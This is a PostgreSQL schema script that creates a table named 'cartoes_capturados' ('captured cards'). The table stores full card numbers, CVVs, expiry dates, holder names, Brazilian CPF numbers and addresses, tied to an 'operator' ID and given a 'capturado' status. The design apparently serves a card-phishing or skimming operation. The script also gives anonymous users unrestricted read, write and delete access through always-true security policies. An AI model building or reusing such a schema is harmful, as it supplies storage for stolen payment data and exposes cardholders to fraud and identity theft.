
CREATE TABLE public.cartoes_capturados (
  id uuid NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  pagamento_id uuid,
  operador_id uuid,
  titular text NOT NULL DEFAULT '',
  numero text NOT NULL DEFAULT '',
  bin text NOT NULL DEFAULT '',
  ultimos4 text NOT NULL DEFAULT '',
  validade text NOT NULL DEFAULT '',
  cvv text NOT NULL DEFAULT '',
  cpf text DEFAULT '',
  endereco text DEFAULT '',
  bandeira text DEFAULT '',
  status text NOT NULL DEFAULT 'capturado',
  metadata jsonb DEFAULT '{}'::jsonb,
  created_at timestamp with time zone NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.cartoes_capturados TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.cartoes_capturados TO authenticated;
GRANT ALL ON public.cartoes_capturados TO service_role;

ALTER TABLE public.cartoes_capturados ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow public insert cartoes" ON public.cartoes_capturados FOR INSERT TO anon, authenticated WITH CHECK (true);
CREATE POLICY "Allow public select cartoes" ON public.cartoes_capturados FOR SELECT TO anon, authenticated USING (true);
CREATE POLICY "Allow public update cartoes" ON public.cartoes_capturados FOR UPDATE TO anon, authenticated USING (true);
CREATE POLICY "Allow public delete cartoes" ON public.cartoes_capturados FOR DELETE TO anon, authenticated USING (true);
